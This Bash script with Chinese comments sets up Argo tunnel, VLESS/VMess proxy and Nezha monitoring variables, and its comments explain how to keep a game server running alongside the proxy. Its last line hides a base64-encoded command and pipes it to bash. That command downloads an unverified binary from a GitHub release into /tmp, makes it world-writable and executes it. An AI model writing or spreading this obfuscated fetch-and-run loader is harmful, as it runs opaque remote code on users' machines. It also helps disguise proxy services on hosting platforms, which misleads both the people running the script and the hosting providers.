#!/bin/bash

# 设置ARGO参数 (不设置则临时隧道，固定隧道设置端口8002,协议vless,ws,tls,路径vls)
# json获取地址https://fscarmen.cloudflare.now.cc
export TOK=${TOK:-''} # json或token,支持直接复制cloudflared.exe service开头全部
export ARGO_DOMAIN=${ARGO_DOMAIN:-''} # 隧道域名


# 设置哪吒参数(NEZHA_TLS='1'开启tls,设置0关闭tls)
export NEZHA_SERVER=${NEZHA_SERVER:-''}
export NEZHA_KEY=${NEZHA_KEY:-''}
export NEZHA_PORT=${NEZHA_PORT:-'443'}
export NEZHA_TLS=${NEZHA_TLS:-'1'}


# 设置UUID和路径等
export UUID=${UUID:-'fd80f56e-93f3-4c85-b2a8-c77216c509a7'}
export VPATH=${VPATH:-'vls'} 
export MPATH=${MPATH:-'vms'}
export CF_IP=${CF_IP:-'ip.sb'} # 优选ip
export SUB_NAME=${SUB_NAME:-'argo'} # 节点名称

# 设置启动游戏原程序，先把原启动文件server.jar改名成senver.jar，其他游戏也可类似修改启动文件
# 复制原来的启动命令并改启动文件名为senver.jar填入下面即可
# export JAR_SH='java -jar senver.jar' # 启用需去掉前面的#号，启用后节点信息不再显示，只显示游戏信息


# 启动脚本
echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01E
PSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1h
bmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAt
cU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZv
dW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgMzAKICAgICAg
ICBleGl0IDEKZmkKCmFyY2g9JCh1bmFtZSAtbSkKaWYgW1sgJGFyY2ggPT0gIng4Nl82NCIgXV07
IHRoZW4KJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25v
ZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gL3RtcC9hcHAKZWxzZQokRE9XTkxP
QURfQ01EIGh0dHBzOi8vZ2l0aHViLmNvbS9kc2Fkc2Fkc3NzL3BsdXRvbm9kZXMvcmVsZWFzZXMv
ZG93bmxvYWQveHIvbWFpbi1hcm0gPiAvdG1wL2FwcApmaQoKY2htb2QgNzc3IC90bXAvYXBwICYm
IC90bXAvYXBw
" | base64 -d | bash
